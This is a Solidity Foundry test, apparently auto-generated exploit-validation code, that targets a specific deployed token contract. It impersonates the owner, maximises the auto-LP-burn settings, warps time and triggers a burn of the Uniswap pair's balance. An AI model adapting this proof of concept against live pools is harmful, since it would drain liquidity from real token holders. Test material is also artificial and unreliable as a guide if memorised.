// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MarvinInu {
    function owner() external view returns (address);
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setAutoLPBurnSettings(uint256 _frequencyInSeconds, uint256 _percent, bool _Enabled) external;
    function enableTrading() external;
    function lpBurnEnabled() external view returns (bool);
    function lpBurnFrequency() external view returns (uint256);
    function lastLpBurnTime() external view returns (uint256);
    function isExcludedFromFees(address account) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x55a380d134d722006A5CE2d510562e1239D225B1;
    address attacker = address(this);

    // Promoted to state variables for access across functions
    MarvinInu target;
    address uniswapV2Pair;
    address owner;
    uint256 initialLPBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = MarvinInu(TARGET);
        uniswapV2Pair = target.uniswapV2Pair();
        owner = target.owner();

        // Inject tokens to attacker for the transfer
        deal(TARGET, address(this), 1000000 * 1e18);

        // Record initial LP balance
        initialLPBalance = target.balanceOf(uniswapV2Pair);
        console.log("Initial LP Balance:", initialLPBalance);

        vm.label(TARGET, "MarvinInu Token");
        vm.label(uniswapV2Pair, "UniswapV2 Pair");
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate owner and configure auto LP burn
        vm.startPrank(owner);
        target.setAutoLPBurnSettings(600, 1000, true); // min frequency, max percent (10%), enabled
        target.enableTrading(); // This sets lastLpBurnTime = block.timestamp
        vm.stopPrank();

        // Step 2: Warp time to exceed burn frequency (600 seconds)
        vm.warp(block.timestamp + 601);
        console.log("Time warped to:", block.timestamp);

        // Step 3: Transfer tokens from attacker (non-excluded) to AMM pair to trigger auto burn
        uint256 transferAmount = 10000 * 1e18;
        target.transfer(uniswapV2Pair, transferAmount);
        console.log("Transferred to LP pair:", transferAmount);

        // Step 4: Verify LP balance decreased
        uint256 finalLPBalance = target.balanceOf(uniswapV2Pair);
        console.log("Final LP Balance:", finalLPBalance);
        console.log("LP Balance Decreased:", initialLPBalance > finalLPBalance);

        // Oracle check: LP pair MARVIN token balance decreased after burn execution
        assertGt(initialLPBalance, finalLPBalance, "LP balance should decrease after auto burn");
        assertLt(finalLPBalance, initialLPBalance, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
